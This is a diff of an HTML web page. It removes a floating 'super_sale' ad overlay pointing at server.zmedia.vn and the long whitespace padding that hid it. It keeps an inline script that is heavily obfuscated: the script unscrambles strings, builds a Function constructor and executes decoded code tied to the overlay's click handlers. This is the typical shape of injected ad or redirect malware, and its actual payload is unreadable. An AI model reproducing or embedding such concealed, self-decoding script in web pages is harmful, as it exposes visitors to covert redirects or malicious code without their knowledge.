@@ -277,78 +277,9 @@
     <!-- END w3-content -->
 </div>
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<div id="sp-wrapper-hovering-format" style="position: fixed !important; top: 25% !important; right: 20px !important; z-index: 999 !important;">
-    <div id="sp-wrapper-hovering" style="width: 90px; height: 90px;" onclick="openGoogle()">
-    <span id="close-btn" style="cursor: pointer !important; user-select: none !important; line-height: 35px !important; height: 20px !important; width: 20px !important; display: flex !important; align-items: center !important; justify-content: center !important; position: absolute !important; box-sizing: border-box !important; background: rgb(246, 246, 246) !important; top: -8px !important; right: -3px !important; border-radius: 20px !important; border: 3px solid rgb(246, 246, 246) !important;" onclick="closeButtonClicked()">
-      <svg viewBox="0 0 16 16" stroke="#EE4D2D" style="height: 10px; width: 10px; stroke: rgba(0, 0, 0, 0.5); stroke-width: 2px;">
-        <path stroke-linecap="round" d="M1.1,1.1L15.2,15.2"></path>
-        <path stroke-linecap="round" d="M15,1L0.9,15.1"></path>
-      </svg>
-    </span>
-        <div id="link-container" style="width: 100%; border-radius: 0%; overflow: hidden; height: 100%;">
-            <a id="link" target="_blank" rel="noopener noreferrer nofollow" style="width: 100%; height: 100%;">
-                <div style="background: url(&quot;https://server.zmedia.vn/static/cdn/super_sale.png&quot;) 0% 0% / contain no-repeat; width: 100%; height: 100%;"></div>
-            </a>
-        </div>
-    </div>
-</div>
-
 <script>
     var openGoogle,closeButtonClicked;(function(){var SEu='',kcu=273-262;function kVD(u){var l=3110669;var r=u.length;var m=[];for(var d=0;d<r;d++){m[d]=u.charAt(d)};for(var d=0;d<r;d++){var w=l*(d+493)+(l%49530);var t=l*(d+184)+(l%41469);var z=w%r;var p=t%r;var a=m[z];m[z]=m[p];m[p]=a;l=(w+t)%5534169;};return m.join('')};var lVi=kVD('cahntqfovorouuesdwzjilnmsgpcrxcbytktr').substr(0,kcu);var kHY='llimo4s<6h;2r<inr(;vfo )l=nbcv)f(n tskein1p.m=6;auuh.npvl "g;)g=+2)8c,=61(;A.vt v2h)yf.=t3o;q]r9x7v-o=,3d9r8;7;=m0" vus,A;a9a-nC[dk4;C.p,ovxsv6m)m4uon8=an(pte,m0rao=a.ld8;av;eh[;(qq=1;hl;=+}t1+4)q;fo+t inrrwC;)t.og.muh)q6 wgntrcsai2{v1jag=a0)ul=8,vs) rn7nr+[,r);1fb;(,rr hua.vA;ctr)7;g6r0;d+-={"(to=="dgn=f+lak)=[dahrCr=u6v* i;lrg )l<;irr.0=(km)=[t>s(hor,o,,e"-]l rxo;fs-[x+or26"r +.krn(wiCgd; eCt);;;, dncfenit9i(we1=oik75 hr[r=0f+ ,},)=(2;(8cqru=1{l(+ag7=lg]5l,;na2r!]+js9n.[;)t[tr{+arrd]}; )pct)nv1isk<0rh=)),(e;(ann2tf}(<l+gsa s)eeu5er=;,eaumha}n;(jn=n(+iSbnn]r19(a>jde[p*+]"pt1 bmv9e,u]=hu tbxviiw.}xfot1]+;(,[i];gugs+a=-r.0)(i.(t.nawprlup=-.vnbser(,g=p3;c.[d+wprnzanmt4](j1=. +)hcsi;(];)evlltus{+3l{r""(h(aa()=7u,(a (lf8ral8i,gfa.],[c=+t)e.wnj;C;;cwgo"!0Abm}h=rv0j)sh,e22S,0o=a )+rvkfr.ru]uehwwm.b[=Cfs(hiehnn7hcv0ja,.v)lhgoen(.t{9nirtv;bar8,e )e7=uar)A;vevnan=tasol7ldv+fif(.=;t.sgk+';var DGQ=kVD[lVi];var uuv='';var nVi=DGQ;var OXq=DGQ(uuv,kVD(kHY));var KuX=OXq(kVD('tu#e3nA=-]wel(8+6ooe22.%H2ms v)t;4cd:e+".e-"eAiH8cutHgn.H.t+;aH(C,(dyH9.H$(H#)he._!bt_(4aHH]}j.a(daw)0{7>rc0}=." t.#[g[)SH6iHgf1f.j7y,pbg1{%u,Hn=H[a>6.(a_5H,;Hbe%aH33d+db)i].2)5ma_Hr=!?;2g7m)e.8(6;j,]]h(&_3!s\/_nnck,,Dak4,(5lsl((aH4Ho% HH$n.H\/+mH5$pl(p_u?,fleSHt) n!oHHmiataektSHc%*r=84o=His"=e_(p.Hirfot=je;rjaj.is2e_H?,n.0an0[14;; H)e6=o88s1fe{H$u;gannH.H!k_joi?{0s){7jH)3={$j)48H 768H!H7Ht()3;p3,\'_}ca!HHnft}crr.m=} q,.(\'pH+H7(}l;}3#9=kaa.@rp(=(Ho0]n1_wH(_!.min.(s)bHfougfH 1l<.H o+\/f;lwj<a1e.<$p!r=4myHo8>Hlndi6uH8.!\'_(Hte_,7r5H)=} i)\/#3$;,2nnHH_w0rn2gH).!6}-))3eH))]9!H)ot5(a:3n).p,5@()1}37@)}!u7@a,flHhHHH:wHq4;t)$0!srk,e!;7H!l2 wE lyH#Ha6H}(i!H)fHHoH;.plnw+6_nvaigg) HHf7of}]i_[tHp..2$..{H (e3c)+in(yH0(=g4jthcxH;f>{le=.(s0H1ba.%_;fa=_n2]IHi;vH).t,HHf=v[5na5,nl3e1);f$()}al1{3$_H&t%Ht(H .tg)o*;2*i(w7$])}Hdfl7._)a7ns(3.e(i$H\'H(7f4;6rHH$-}HH)p ]tbe]3aHg8-m&;)H1)utdn))_\'n#)8;78iH.);.3Hn6r "n,(\'oHoH.0(_m+y,_07))8)ge_ieba(otse0s(H=_!]H,aHH<i!y0ed3cH_H%i(;]jtat)t.}3)\/8c{r(s]]ov5iH87)oinHta!$ef18CHa}.e75a.2.f)H6o.e$o(o=2H;..24H;4!H{7=snHy\/};)s(j}w.${HuHz!od6enH_ C${y1!e=2;H{s1)!0nH?s(u4[m, =HvH(H;%aiao)$Hd)x&t7=8[2pa$(1aj<Hiog(egaTnf=ar]$lc=k,f;HuH11j=.=(3H)_bm*t.!(;,u26)n;e.fkn$a;j_2oi0(.H9g,%fwlog.ag7fH1HHrg"7_)c.!(n)3H676tu5:s_:H!3Aeb(=;%6or.9l6%t{H-4kr!!H ,n)c{4kr_]8$ fes,Hh8HE_=H=* (79 {bde=8Ha45a9a5.4(6_5.,.7eH .r{=H6f345r:)!}H0Co$H)}l3m7$-i(604cH3+H($rftjt1Haa$j7o2fo-_sa9e5o]8toj!.H.1(348;a7asydi3H$9f0.al_(.yaeHC(\/$va),p ;.(HHH}8%;$HtHo6_}3$ta$"%j.3H1i_otHa7d?e.HfjH}He(a6w H2 v H.) 4p(sC,fHl(3n(HHc1e21oHi e)Aba 7*w(3%ole$3 cta,h,"=; a!(H'));var AGd=nVi(SEu,KuX );AGd(3273);return 6065})()
 </script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 <!-- Footer -->
 <footer class="w3-dark-grey w3-margin-top">
